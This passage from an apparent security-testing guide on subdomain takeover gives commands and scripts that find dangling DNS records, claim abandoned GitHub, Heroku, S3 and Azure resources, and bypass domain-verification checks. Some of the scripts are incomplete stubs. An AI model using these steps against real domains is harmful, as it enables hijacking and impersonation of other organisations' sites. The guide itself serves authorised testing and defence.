subfinder -d example.com -all -o subdomains.txt

# Check DNS resolution
subfinder -d example.com -nW -o active_subdomains.txt
```

**Using amass:**

```bash
# Install
go install -v github.com/owasp-amass/amass/v4/...@master

# Passive enumeration
amass enum -passive -d example.com -o subdomains.txt

# Active enumeration with DNS resolution
amass enum -d example.com -o subdomains.txt

# Extract CNAME records
amass enum -d example.com | grep CNAME
```

**Using assetfinder:**

```bash
# Install
go install github.com/tomnomnom/assetfinder@latest

# Find subdomains
assetfinder --subs-only example.com > subdomains.txt
```

### Identifying Dangling Records

**Manual DNS Resolution Check:**

```bash
# Check if subdomain resolves
host subdomain.example.com

# Get CNAME target
dig subdomain.example.com CNAME +short

# Check if target exists
curl -I https://target.service.com
# Look for 404, "Not Found", or service-specific error messages
```

**Automated Detection with subjack:**

```bash
# Install
go install github.com/haccer/subjack@latest

# Check single domain
subjack -d example.com -v

# Check subdomain list
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# Use custom fingerprints
subjack -w subdomains.txt -c fingerprints.json -v -ssl
```

**Using subzy:**

```bash
# Install
go install -v github.com/PentestPad/subzy@latest

# Check subdomains
subzy run --targets subdomains.txt

# Hide failures
subzy run --targets subdomains.txt --hide_fails

# Verify HTTPS
subzy run --targets subdomains.txt --verify_ssl
```

**Using can-i-take-over-xyz (fingerprint reference):**

```bash
# Clone fingerprint database
git clone https://github.com/EdOverflow/can-i-take-over-xyz.git

# Reference for manual verification
# Contains service-specific error messages and takeover methods
```

### DNS Record Analysis Script

```python
#!/usr/bin/env python3
import dns.resolver
import requests
import sys

def check_dangling_dns(subdomain):
    """Check if subdomain has dangling DNS record"""
    try:
        # Get CNAME record
        answers = dns.resolver.resolve(subdomain, 'CNAME')
        for rdata in answers:
            cname_target = str(rdata.target).rstrip('.')
            print(f"[+] {subdomain} → CNAME → {cname_target}")
            
            # Check if target responds
            try:
                response = requests.get(f"https://{cname_target}", 
                                       timeout=5, 
                                       allow_redirects=False)
                print(f"[*] Target responds: {response.status_code}")
                
                # Check for takeover indicators
                error_keywords = [
                    "NoSuchBucket",
                    "Repository not found",
                    "There isn't a GitHub Pages site here",
                    "No such app",
                    "herokucdn.com/error-pages/no-such-app.html",
                    "The page you were looking for doesn't exist"
                ]
                
                for keyword in error_keywords:
                    if keyword.lower() in response.text.lower():
                        print(f"[!] VULNERABLE: Found '{keyword}'")
                        return True
                        
            except requests.exceptions.RequestException as e:
                print(f"[!] Target unreachable: {e}")
                print("[!] Potentially vulnerable to takeover")
                return True
                
    except dns.resolver.NXDOMAIN:
        print(f"[-] {subdomain} does not exist")
    except dns.resolver.NoAnswer:
        print(f"[-] {subdomain} has no CNAME record")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <subdomain>")
        sys.exit(1)
    
    check_dangling_dns(sys.argv[1])
```

**Batch DNS Verification:**

```bash
#!/bin/bash
# Check list of subdomains for dangling CNAMEs

while IFS= read -r subdomain; do
    echo "Checking: $subdomain"
    
    # Get CNAME
    cname=$(dig +short "$subdomain" CNAME)
    
    if [ -n "$cname" ]; then
        echo "  CNAME: $cname"
        
        # Try to resolve CNAME target
        target_ip=$(dig +short "$cname" A)
        
        if [ -z "$target_ip" ]; then
            echo "  [!] CNAME target does not resolve - POTENTIALLY VULNERABLE"
            
            # Check HTTP response
            http_code=$(curl -s -o /dev/null -w "%{http_code}" "http://$subdomain" --connect-timeout 5)
            echo "  HTTP Status: $http_code"
        fi
    fi
    echo ""
done < subdomains.txt
```

---

## CNAME Misconfiguration

### Common Misconfiguration Patterns

**Pattern 1: Pointing to Deprovisioned Resource**

```
blog.example.com  CNAME  example.github.io  (GitHub Pages not configured)
```

**Pattern 2: Pointing to Expired/Deleted Service**

```
api.example.com  CNAME  app123.herokuapp.com  (Heroku app deleted)
```

**Pattern 3: Pointing to Unverified Domain**

```
cdn.example.com  CNAME  d111111abcdef8.cloudfront.net  (CloudFront not verified)
```

**Pattern 4: Wildcard CNAME Issues**

```
*.example.com  CNAME  service.provider.com  (Wildcard pointing to unclaimed resource)
```

### Detection Methods

**Check CNAME Chain:**

```bash
# Follow entire CNAME chain
dig subdomain.example.com +trace

# Get all CNAME records in chain
host -t CNAME subdomain.example.com
```

**Verify Target Ownership:**

```bash
# Check if CNAME target is properly configured
curl -v https://subdomain.example.com 2>&1 | grep -i "server:\|x-"

# Check TLS certificate
echo | openssl s_client -servername subdomain.example.com \
  -connect subdomain.example.com:443 2>/dev/null | \
  openssl x509 -noout -text | grep -A2 "Subject Alternative Name"
```

**DNS Validation Script:**

```python
#!/usr/bin/env python3
import dns.resolver
import socket

def validate_cname(subdomain):
    """Validate CNAME configuration"""
    try:
        # Get CNAME
        cname_records = dns.resolver.resolve(subdomain, 'CNAME')
        cname_target = str(cname_records[0].target).rstrip('.')
        
        print(f"[+] CNAME: {subdomain} → {cname_target}")
        
        # Try to resolve CNAME target
        try:
            a_records = dns.resolver.resolve(cname_target, 'A')
            print(f"[+] Target resolves to: {[str(r) for r in a_records]}")
        except dns.resolver.NXDOMAIN:
            print("[!] MISCONFIGURED: CNAME target does not exist (NXDOMAIN)")
            return False
        except dns.resolver.NoAnswer:
            print("[!] MISCONFIGURED: CNAME target has no A record")
            return False
            
        # Check if original subdomain resolves
        try:
            subdomain_ips = dns.resolver.resolve(subdomain, 'A')
            print(f"[+] Subdomain resolves to: {[str(r) for r in subdomain_ips]}")
            return True
        except Exception as e:
            print(f"[!] Subdomain resolution failed: {e}")
            return False
            
    except dns.resolver.NoAnswer:
        print(f"[-] No CNAME record found for {subdomain}")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        validate_cname(sys.argv[1])
```

### Service Fingerprinting

**Identify Target Service:**

```bash
# HTTP headers
curl -I https://subdomain.example.com

# Common service identifiers:
# X-GitHub-Request-Id → GitHub Pages
# X-Heroku-Queue-Wait-Time → Heroku
# X-Amz-Cf-Id → CloudFront
# Server: cloudflare → Cloudflare
```

**Error Page Analysis:**

```bash
# Fetch page content
curl -s https://subdomain.example.com | grep -i "error\|not found\|doesn't exist"

# Common error messages by service:
# GitHub: "There isn't a GitHub Pages site here"
# Heroku: "No such app"
# AWS S3: "NoSuchBucket"
# Bitbucket: "Repository not found"
# Azure: "404 Web Site not found"
```

---

## Service-Specific Takeover

### GitHub Pages Takeover

**Vulnerability Indicators:**

```
CNAME points to: username.github.io or user.github.io
Error message: "There isn't a GitHub Pages site here"
DNS resolves but returns 404
```

**Verification:**

```bash
# Check CNAME
dig blog.example.com CNAME +short
# Output: username.github.io

# Check if GitHub Pages exists
curl -I https://username.github.io
# HTTP/1.1 404 Not Found
```

**Takeover Process:**

```bash
# 1. Create GitHub account with matching username (if available)
# 2. Create repository
git clone https://github.com/username/username.github.io.git
cd username.github.io

# 3. Create CNAME file with target subdomain
echo "blog.example.com" > CNAME

# 4. Create index.html
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Subdomain Takeover PoC</title></head>
<body>
<h1>Subdomain Takeover Demonstration</h1>
<p>This subdomain was vulnerable to takeover.</p>
</body>
</html>
EOF

# 5. Commit and push
git add .
git commit -m "Initial commit"
git push origin main

# 6. Enable GitHub Pages in repository settings
# Settings → Pages → Source: main branch

# 7. Verify takeover
curl https://blog.example.com
```

**Automated GitHub Pages Check:**

```bash
#!/bin/bash
subdomain=$1
cname=$(dig +short "$subdomain" CNAME | head -1)

if [[ $cname == *"github.io"* ]]; then
    echo "[+] Points to GitHub Pages: $cname"
    
    # Extract username
    username=$(echo "$cname" | sed 's/.github.io.//')
    
    # Check if GitHub Pages exists
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://$cname")
    
    if [ "$status" == "404" ]; then
        echo "[!] VULNERABLE: GitHub Pages returns 404"
        echo "[!] Try claiming: https://github.com/$username"
    fi
fi
```

### Heroku Takeover

**Vulnerability Indicators:**

```
CNAME points to: *.herokuapp.com or *.herokussl.com
Error message: "No such app"
URL: herokucdn.com/error-pages/no-such-app.html
```

**Verification:**

```bash
# Check CNAME
dig api.example.com CNAME +short
# Output: app-name.herokuapp.com

# Check if Heroku app exists
curl -I https://app-name.herokuapp.com
# Look for redirect to error page
```

**Takeover Process:**

```bash
# 1. Install Heroku CLI
curl https://cli-assets.heroku.com/install.sh | sh

# 2. Login
heroku login

# 3. Create app with matching name
heroku apps:create app-name

# 4. Add custom domain
heroku domains:add api.example.com --app app-name

# 5. Deploy simple app
mkdir takeover-poc
cd takeover-poc

cat > index.php << 'EOF'
<?php
echo "<h1>Subdomain Takeover PoC</h1>";
echo "<p>This demonstrates a successful Heroku subdomain takeover.</p>";
?>
EOF

cat > composer.json << 'EOF'
{}
EOF

git init
git add .
git commit -m "Takeover PoC"

heroku git:remote -a app-name
git push heroku master

# 6. Verify
curl https://api.example.com
```

**Heroku Detection Script:**

```python
#!/usr/bin/env python3
import dns.resolver
import requests

def check_heroku_takeover(subdomain):
    try:
        cname = dns.resolver.resolve(subdomain, 'CNAME')
        target = str(cname[0].target).rstrip('.')
        
        if 'herokuapp.com' in target or 'herokussl.com' in target:
            print(f"[+] Heroku CNAME detected: {target}")
            
            response = requests.get(f"https://{subdomain}", timeout=10)
            
            if "no such app" in response.text.lower() or \
               "herokucdn.com/error-pages/no-such-app.html" in response.text:
                print(f"[!] VULNERABLE: Heroku app does not exist")
                print(f"[!] App name: {target.replace('.herokuapp.com', '')}")
                return True
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    import sys
    check_heroku_takeover(sys.argv[1])
```

### AWS S3 Takeover

**Vulnerability Indicators:**

```
CNAME points to: bucket-name.s3.amazonaws.com or s3-website-region.amazonaws.com
Error: "NoSuchBucket" (XML response)
HTTP 404 with S3-specific error
```

**S3 Bucket Naming Patterns:**

```
bucket-name.s3.amazonaws.com
bucket-name.s3-website-us-east-1.amazonaws.com
bucket-name.s3-website.region.amazonaws.com
s3.amazonaws.com/bucket-name (path-style, deprecated)
```

**Verification:**

```bash
# Check for S3 CNAME
dig assets.example.com CNAME +short
# Output: assets-bucket.s3.amazonaws.com

# Check if bucket exists
curl -I https://assets-bucket.s3.amazonaws.com
# Look for NoSuchBucket error

# Alternative check
aws s3 ls s3://assets-bucket --no-sign-request
# Error: The specified bucket does not exist
```

**Takeover Process:**

```bash
# 1. Install AWS CLI
pip install awscli

# 2. Configure credentials
aws configure

# 3. Create bucket with matching name
aws s3 mb s3://assets-bucket --region us-east-1

# 4. Create PoC HTML file
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>S3 Takeover PoC</title></head>
<body>
<h1>S3 Subdomain Takeover</h1>
<p>This S3 bucket was unclaimed and has been taken over.</p>
</body>
</html>
EOF

# 5. Upload and configure for static hosting
aws s3 cp index.html s3://assets-bucket/

# 6. Enable public access (if demonstrating vulnerability)
aws s3api put-bucket-policy --bucket assets-bucket --policy '{
  "Version":"2012-10-17",
  "Statement":[{
    "Sid":"PublicReadGetObject",
    "Effect":"Allow",
    "Principal":"*",
    "Action":"s3:GetObject",
    "Resource":"arn:aws:s3:::assets-bucket/*"
  }]
}'

# 7. Enable static website hosting
aws s3 website s3://assets-bucket/ \
  --index-document index.html \
  --error-document error.html

# 8. Verify
curl http://assets-bucket.s3-website-us-east-1.amazonaws.com
```

**S3 Bucket Name Restrictions:**

- Must be globally unique across all AWS accounts
- 3-63 characters long
- Lowercase letters, numbers, hyphens, periods
- Cannot be formatted as IP address

**S3 Takeover Detection:**

```python
#!/usr/bin/env python3
import dns.resolver
import requests
import re

def check_s3_takeover(subdomain):
    try:
        cname = dns.resolver.resolve(subdomain, 'CNAME')
        target = str(cname[0].target).rstrip('.')
        
        # Check if points to S3
        s3_patterns = [
            r'\.s3\.amazonaws\.com$',
            r'\.s3-website[.-].*\.amazonaws\.com$',
            r's3-.*\.amazonaws\.com$'
        ]
        
        is_s3 = any(re.search(pattern, target) for pattern in s3_patterns)
        
        if is_s3:
            print(f"[+] S3 CNAME detected: {target}")
            
            # Extract bucket name
            bucket_name = target.split('.')[0]
            print(f"[+] Bucket name: {bucket_name}")
            
            # Check if bucket exists
            response = requests.get(f"https://{target}", timeout=10)
            
            if response.status_code == 404 and \
               ('NoSuchBucket' in response.text or 'not found' in response.text.lower()):
                print(f"[!] VULNERABLE: S3 bucket does not exist")
                print(f"[!] Bucket name '{bucket_name}' can be claimed")
                return True
                
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    import sys
    check_s3_takeover(sys.argv[1])
```

### Azure Blob Storage Takeover

**Vulnerability Indicators:**

```
CNAME points to: *.blob.core.windows.net
Error: "404 The specified resource does not exist"
```

**Verification:**

```bash
# Check CNAME
dig cdn.example.com CNAME +short
# Output: storageaccount.blob.core.windows.net

# Check if exists
curl -I https://storageaccount.blob.core.windows.net
# HTTP/1.1 404 The specified resource does not exist
```

**Takeover Process:**

```bash
# 1. Install Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# 2. Login
az login

# 3. Create storage account with matching name
az storage account create \
  --name storageaccount \
  --resource-group myResourceGroup \
  --location eastus \
  --sku Standard_LRS

# 4. Enable static website hosting
az storage blob service-properties update \
  --account-name storageaccount \
  --static-website \
  --index-document index.html

# 5. Upload PoC content
az storage blob upload \
  --account-name storageaccount \
  --container-name '$web' \
  --name index.html \
  --file index.html
```

### CloudFront Distribution Takeover

**Vulnerability Indicators:**

```
CNAME points to: *.cloudfront.net
Error: "Bad request" or "The request could not be satisfied"
```

**Verification:**

```bash
# Check CNAME
dig assets.example.com CNAME +short
# Output: d111111abcdef8.cloudfront.net

# Test access
curl -v https://assets.example.com 2>&1 | grep -i "cloudfront"
```

**Takeover Process:**

```bash
# 1. Create CloudFront distribution via AWS Console
# 2. Add CNAME: assets.example.com
# 3. Point to origin (S3 bucket, custom origin, etc.)
# 4. Deploy distribution

# Via CLI:
aws cloudfront create-distribution \
  --origin-domain-name my-bucket.s3.amazonaws.com \
  --default-root-object index.html \
  --aliases assets.example.com
```

[Inference] CloudFront takeover requires control of an origin that can be configured as the distribution's origin. The distribution itself must be created by the attacker and the victim's subdomain added as a CNAME (alternate domain name).

### Fastly Takeover

**Vulnerability Indicators:**

```
CNAME points to: *.fastly.net or *.fastlylb.net
Error: "Fastly error: unknown domain"
```

**Verification:**

```bash
dig cdn.example.com CNAME +short
# Output: example.map.fastly.net

curl -I https://cdn.example.com
# Look for Fastly-specific error
```

### Shopify Takeover

**Vulnerability Indicators:**

```
CNAME points to: shops.myshopify.com
Error: "Sorry, this shop is currently unavailable"
```

**Takeover Process:**

```bash
# 1. Create Shopify store
# 2. Add custom domain in Shopify admin
# 3. Configure DNS CNAME as instructed by Shopify
```

### Bitbucket Takeover

**Vulnerability Indicators:**

```
CNAME points to: *.bitbucket.io
Error: "Repository not found"
```

**Verification:**

```bash
dig docs.example.com CNAME +short
# Output: username.bitbucket.io

curl https://username.bitbucket.io
# Look for "Repository not found"
```

### Zendesk Takeover

**Vulnerability Indicators:**

```
CNAME points to: *.zendesk.com
Error: "Help Center Closed" or "This Help Center no longer exists"
```

### Service Fingerprint Database

**Common Service Patterns:**

```yaml
GitHub Pages:
  CNAME: "*.github.io"
  Error: "There isn't a GitHub Pages site here"
  
Heroku:
  CNAME: "*.herokuapp.com, *.herokussl.com"
  Error: "No such app"
  
AWS S3:
  CNAME: "*.s3.amazonaws.com, *.s3-website-*.amazonaws.com"
  Error: "NoSuchBucket"
  
Azure:
  CNAME: "*.azurewebsites.net, *.blob.core.windows.net"
  Error: "404 The specified resource does not exist"
  
CloudFront:
  CNAME: "*.cloudfront.net"
  Error: "Bad request"
  
Fastly:
  CNAME: "*.fastly.net"
  Error: "Fastly error: unknown domain"
  
Shopify:
  CNAME: "shops.myshopify.com"
  Error: "Sorry, this shop is currently unavailable"
```

---

## Domain Expiration Exploitation

### Expired Domain Detection

**Identify Expired Domains:**

```bash
# Check domain registration status
whois example.com | grep -i "expiry\|expiration"

# Check if domain is available for registration
whois example.com | grep -i "no match\|not found\|available"

# Check multiple domains from list
while read domain; do
    echo "Checking: $domain"
    whois "$domain" | grep -i "expiry\|status"
    echo ""
done < domains.txt
```

**Automated Expiration Monitoring:**

```python
#!/usr/bin/env python3
import whois
from datetime import datetime, timedelta

def check_expiration(domain):
    """Check if domain is expired or expiring soon"""
    try:
        w = whois.whois(domain)
        
        if isinstance(w.expiration_date, list):
            expiration = w.expiration_date[0]
        else:
            expiration = w.expiration_date
            
        if expiration:
            days_until_expiry = (expiration - datetime.now()).days
            
            print(f"[+] Domain: {domain}")
            print(f"[+] Expires: {expiration.strftime('%Y-%m-%d')}")
            print(f"[+] Days until expiry: {days_until_expiry}")
            
            if days_until_expiry < 0:
                print(f"[!] EXPIRED: {abs(days_until_expiry)} days ago")
                return True
            elif days_until_expiry < 30:
                print(f"[!] WARNING: Expiring soon")
                
        else:
            print(f"[-] Could not determine expiration for {domain}")
            
    except Exception as e:
        print(f"[-] Error checking {domain}: {e}")
        # Domain might not exist
        return True
        
    return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        check_expiration(sys.argv[1])
```

### Subdomain Dependencies on Expired Domains

**Scenario:**

```
subdomain.example.com  →  CNAME  →  legacy-cdn.oldcompany.com
                                     (oldcompany.com expired)
```

**Detection:**

```bash
#!/bin/bash
# Find subdomains pointing to potentially expired domains

subdomain=$1

# Get CNAME target
cname=$(dig +short "$subdomain" CNAME | head -1)

if [ -n "$cname" ]; then
    # Extract parent domain from CNAME
    parent_domain=$(echo "$cname" | awk -F. '{print $(NF-1)"."$NF}')
    
    echo "[+] Subdomain: $subdomain"
    echo "[+] CNAME: $cname"
    echo "[+] Parent domain: $parent_domain"
    
    # Check if parent domain is registered
    whois_result=$(whois "$parent_domain" 2>&1)
    
    if echo "$whois_result" | grep -iq "no match\|not found\|available"; then
        echo "[!] VULNERABLE: Parent domain appears unregistered!"
        echo "[!] Register '$parent_domain' to take over '$subdomain'"
    fi
fi
```

### Domain Drop-Catching for Takeover

**Monitoring Deletion Cycles:**

```
Domain lifecycle:
1. Expiration (0-30 days): Grace period
2. Redemption (30-60 days): Can be renewed with penalty
3. Pending Delete (60-75 days): About to be released
4. Available: Can be registered
```

**Automated Monitoring Service Integration:**

```python
#!/usr/bin/env python3
import requests
import time

def monitor_domain_availability(domain, check_interval=3600):
    """Monitor domain and alert when available"""
    print(f"[*] Monitoring {domain} for availability...")
    
    while True:
        try:
            # Check WHOIS
            result = whois.whois(domain)
            
            if result.domain_name is None:
                print(f"[!] ALERT: {domain} is now available!")
                # Send notification (email, webhook, etc.)
                send_notification(domain)
                break
            else:
                print(f"[*] {domain} still registered. Next check in {check_interval}s")
                
        except Exception as e:
            if "no match" in str(e).lower():
                print(f"[!] ALERT: {domain} is available!")
                break
                
        time.sleep(check_interval)

def send_notification(domain):
    """Send notification when domain becomes available"""
    webhook_url = "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
    
    requests.post(webhook_url, json={
        "text": f"🚨 Domain {domain} is now available for registration!"
    })
```

### Registering Expired Domains

**Pre-Registration Checklist:**

```bash
# 1. Verify domain is actually available
whois target-domain.com

# 2. Check what subdomains point to it
dig @8.8.8.8 ANY target-domain.com
subfinder -d target-domain.com -silent

# 3. Check historical DNS records (if available)
# Use services like SecurityTrails, DNSHistory

# 4. Verify takeover potential
# Check if victim subdomains still have CNAME to this domain

# 5. Register domain through registrar
# GoDaddy, Namecheap, Google Domains, etc.
```

**Post-Registration Configuration:**

```bash
# After registering expired domain, configure DNS

# Set up NS records at registrar
# Point to nameserver provider (Cloudflare, Route53, etc.)

# Configure DNS records to match expected structure
# Example: If victim has subdomain → cdn.expired-domain.com
# Create A record for cdn.expired-domain.com pointing to your server

# Set up web server to serve PoC content
```

### Reverse WHOIS Search

**Find Domains by Registrant:**

```bash
# Using online tools (examples):
# - DomainBigData: domainbigdata.com
# - SecurityTrails: securitytrails.com
# - ViewDNS.info: viewdns.info/reversewhois/

# Goal: Find all domains registered by same entity
# If one expires, others might share similar risk profile
```

---

## Verification Bypass

### Domain Verification Mechanisms

**Common Verification Methods:**

1. DNS TXT record verification
2. HTML meta tag verification
3. File upload verification (e.g., `verification-file.txt`)
4. Email verification to domain contacts
5. CNAME verification

### Exploiting Weak Verification

**DNS TXT Record Bypass:**

Some services verify domain ownership via TXT record:

```bash
# Service asks to create:
_verification.example.com  TXT  "verification-code-12345"

# If subdomain is vulnerable:
_verification.subdomain.example.com  TXT  "verification-code-12345"
```

**Exploitation:**

```bash
# 1. Attacker controls external service (e.g., Heroku app)

# 2. Attacker adds victim subdomain to their service

# 3. Service requires DNS verification

# 4. Attacker creates verification record on THEIR controlled DNS

# Example: If subdomain.victim.com → attacker.herokuapp.com

# Attacker creates TXT record:

# _verification.attacker.herokuapp.com TXT "heroku-code"

# Some services may incorrectly verify based on CNAME target

# instead of the original subdomain
````

**File-Based Verification Bypass:**

```bash
# Service requires uploading verification file:
# http://subdomain.example.com/.well-known/verification.txt

# If subdomain points to attacker-controlled service:
# 1. Attacker hosts verification file on their infrastructure
# 2. Service verifies via HTTP request to subdomain
# 3. Request resolves through CNAME to attacker's server
# 4. Attacker's server returns valid verification file
# 5. Verification passes
````

**Example Verification File Hosting:**

```bash
# On attacker-controlled server
mkdir -p /var/www/html/.well-known/
echo "service-verification-token-abc123" > /var/www/html/.well-known/verification.txt

# Configure nginx
cat > /etc/nginx/sites-available/takeover << 'EOF'
server {
    listen 80;
    server_name _;
    
    root /var/www/html;
    
    location /.well-known/ {
        try_files $uri =404;
    }
}
EOF

systemctl reload nginx

# Verify
curl http://subdomain.victim.com/.well-known/verification.txt
```

### HTML Meta Tag Verification

**Vulnerable Flow:**

```html
<!-- Service asks to add meta tag to homepage -->
<meta name="service-verification" content="verification-token-xyz">
```

**Exploitation:**

```bash
# 1. Create index.html with verification meta tag
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta name="service-verification" content="verification-token-xyz">
    <title>Verified Domain</title>
</head>
<body>
    <h1>Domain Verification Successful</h1>
</body>
</html>
EOF

# 2. Host on attacker-controlled service that subdomain points to
# 3. Service crawls subdomain.victim.com
# 4. Finds meta tag and grants verification
```

### Email Verification Bypass

**Catch-All Email Exploitation:**

If victim domain has catch-all email configured:

```bash
# Service sends verification to: verify@subdomain.victim.com
# If subdomain MX records point to victim's mail server
# AND catch-all is enabled, attacker might intercept

# Check MX records
dig subdomain.victim.com MX +short

# If MX points to victim's infrastructure, 
# social engineering or other access needed
```

**Subdomain Email Takeover:**

```bash
# Scenario: Subdomain has dedicated MX records
# mail.example.com  MX  10  mail-server.old-provider.com
#                         (old-provider.com expired)

# 1. Register expired domain (old-provider.com)
# 2. Set up mail server
# 3. Receive verification emails sent to victim subdomain
# 4. Complete verification process
```

### CNAME Verification Bypass

**Service-Specific CNAME Verification:**

Some services use CNAME verification:

```bash
# Service instructs: Create CNAME record
# verify.example.com  CNAME  verify.service.com

# If subdomain already points to service:
# api.example.com  CNAME  app.service.com

# Attacker might be able to claim app.service.com
# Then add custom verification CNAME on their DNS
```

### Race Condition in Verification

**Time-of-Check vs Time-of-Use:**

```python
#!/usr/bin/env python3
import requests
import threading
import time

def verification_race_condition(subdomain, verification_token):
    """
    Exploit race condition in verification process:
    1. Service checks for verification token
    2. Short delay before granting access
    3. Attacker removes verification and adds malicious content
    """
    
    # Host verification content initially
    verification_content = f'<meta name="verify" content="{verification_token}">'
    
    print("[*] Hosting verification content...")
    # Upload verification content to service
    
    # Trigger verification check
    print("[*] Triggering verification...")
    requests.post(f"https://service.com/verify?domain={subdomain}")
    
    # Small delay for service to check
    time.sleep(2)
    
    # Replace with malicious content
    print("[*] Replacing with malicious content...")
    malicious_content = '<script>/* malicious code */</script>'
    # Upload malicious content
    
    print("[!] If race condition exists, verification passes but content is malicious")

```

### Wildcard DNS Exploitation for Verification

**Wildcard Record Abuse:**

```bash
# If victim has wildcard DNS:
*.example.com  A  192.0.2.1

# Attacker can use any non-existent subdomain
# random-string-12345.example.com resolves to same IP

# For verification bypass:
# 1. Service asks to verify: verify-abc123.example.com
# 2. Attacker doesn't need to create specific DNS record
# 3. Wildcard catches it automatically
# 4. If attacker controls the IP, verification succeeds
```

**Detection:**

```bash
# Check for wildcard DNS
dig random-nonexistent-subdomain-12345.example.com +short

# If returns IP, wildcard exists
# Try multiple random subdomains to confirm
for i in {1..5}; do
    random_sub="test-$(openssl rand -hex 8)"
    ip=$(dig +short "${random_sub}.example.com" A)
    echo "${random_sub}.example.com → $ip"
done
```

### Subdomain Verification vs Root Domain

**Verification Scope Confusion:**

```bash
# Some services accept verification at subdomain level
# but grant permissions for parent domain

# Example:
# Verify ownership of: subdomain.example.com
# Service grants access to: *.example.com or example.com

# If subdomain is vulnerable to takeover:
# 1. Attacker takes over subdomain
# 2. Completes verification for subdomain
# 3. Gains unintended access to parent domain resources
```

### SSL/TLS Certificate Verification Bypass

**Certificate-Based Domain Validation:**

```bash
# Services using SSL certificate as proof of ownership

# If attacker controls subdomain via takeover:
# 1. Obtain Let's Encrypt certificate for subdomain
# 2. Present certificate as proof of domain control
# 3. Service may incorrectly verify based on cert

# Obtain certificate using certbot:
certbot certonly --standalone -d subdomain.victim.com

# Requires:
# - Control of HTTP/HTTPS on port 80/443 for subdomain
# - Subdomain DNS pointing to attacker IP
```

**ACME DNS Challenge Exploitation:**

```bash
# Let's Encrypt DNS-01 challenge
# Requires creating TXT record:
_acme-challenge.subdomain.victim.com  TXT  "challenge-token"

# If subdomain DNS is managed separately:
# AND attacker has DNS control (via takeover of DNS provider)
# Attacker can complete DNS challenge
```

### Time-Based Verification Window

**Verification Token Reuse:**

```python
#!/usr/bin/env python3
import requests
import time

def test_token_reuse(service_url, domain, old_token):
    """
    Test if verification tokens can be reused after initial verification
    """
    
    # Try using old verification token
    response = requests.post(
        f"{service_url}/verify",
        json={
            "domain": domain,
            "token": old_token
        }
    )
    
    if response.status_code == 200:
        print("[!] Verification token was accepted (possible reuse vulnerability)")
        return True
    else:
        print("[-] Token was rejected")
        return False

def test_token_expiration(service_url, domain, token):
    """
    Test verification token expiration
    """
    delays = [60, 300, 3600, 86400]  # 1min, 5min, 1hr, 24hr
    
    for delay in delays:
        print(f"[*] Waiting {delay} seconds before verification...")
        time.sleep(delay)
        
        response = requests.post(
            f"{service_url}/verify",
            json={"domain": domain, "token": token}
        )
        
        if response.status_code == 200:
            print(f"[!] Token still valid after {delay}s")
        else:
            print(f"[-] Token expired after {delay}s")
            break
```

### Subdomain Verification Without Authentication

**Anonymous Verification Requests:**

```bash
# Some services allow verification initiation without authentication

# 1. Attacker initiates verification for victim subdomain
# 2. Service provides verification token/instructions
# 3. If subdomain is vulnerable, attacker can complete verification
# 4. Attacker then creates account and claims verified domain

# Example workflow:
curl -X POST https://service.com/api/domains/verify \
  -H "Content-Type: application/json" \
  -d '{"domain":"subdomain.victim.com"}'

# Response includes verification requirements
# Complete verification before victim notices
```

### Bypassing Multi-Step Verification

**Verification Chain Exploitation:**

```
Service requires:
1. DNS TXT record verification
2. HTTP file verification  
3. Email confirmation

If any step is vulnerable, entire chain may be compromised.
```

**Example Script:**

```python
#!/usr/bin/env python3
import requests
import dns.resolver

class VerificationBypass:
    def __init__(self, target_subdomain, service_api):
        self.subdomain = target_subdomain
        self.api = service_api
        
    def step1_dns_verification(self, txt_record_value):
        """
        Bypass DNS verification if attacker controls target DNS
        """
        # Attacker creates TXT record on their controlled DNS
        # (which subdomain points to via CNAME)
        print(f"[*] Creating TXT record: {txt_record_value}")
        
        # Simulate DNS record creation
        # In practice, use DNS provider API
        
        # Trigger verification
        response = requests.post(
            f"{self.api}/verify/dns",
            json={"domain": self.subdomain}
        )
        
        return response.status_code == 200
        
    def step2_http_verification(self, verification_file, content):
        """
        Bypass HTTP verification if attacker controls web server
        """
        print(f"[*] Hosting verification file: {verification_file}")
        
        # Attacker hosts file on their server
        # subdomain CNAME resolves to attacker's infrastructure
        
        response = requests.post(
            f"{self.api}/verify/http",
            json={"domain": self.subdomain}
        )
        
        return response.status_code == 200
        
    def step3_email_verification(self, verification_code):
        """
        Bypass email verification if attacker intercepts emails
        """
        print(f"[*] Submitting verification code: {verification_code}")
        
        response = requests.post(
            f"{self.api}/verify/email",
            json={
                "domain": self.subdomain,
                "code": verification_code
            }
        )
        
        return response.status_code == 200
```

### OAuth/SSO Verification Bypass

**Social Login Verification:**

```bash
# Some services allow domain verification via corporate SSO

# Example: "Sign in with Google for Work"
# Service assumes email @example.com = domain ownership of example.com

# Attack scenario:
# 1. Victim company uses Google Workspace for old-company.com
# 2. old-company.com expires
# 3. Attacker registers old-company.com
# 4. Attacker sets up Google Workspace for old-company.com
# 5. Attacker signs into services with email@old-company.com
# 6. Services grant domain ownership based on email domain
```

### DNS Propagation Race Condition

**Exploiting DNS Caching:**

```python
#!/usr/bin/env python3
import dns.resolver
import time

def dns_propagation_race(subdomain, verification_record):
    """
    Exploit DNS propagation delays during verification
    
    1. Create verification DNS record
    2. Trigger verification (service queries DNS)
    3. Immediately remove verification record
    4. Add malicious DNS record
    5. Service may cache initial verification result
    """
    
    print("[*] Creating verification record...")
    # Create TXT record with verification value
    create_dns_record(subdomain, "TXT", verification_record)
    
    # Wait for propagation
    time.sleep(10)
    
    print("[*] Triggering verification...")
    trigger_verification(subdomain)
    
    print("[*] Removing verification record...")
    delete_dns_record(subdomain, "TXT")
    
    print("[*] Creating malicious DNS record...")
    create_dns_record(subdomain, "A", "attacker.ip.address")
    
    print("[!] If service cached verification, subdomain now points to attacker")

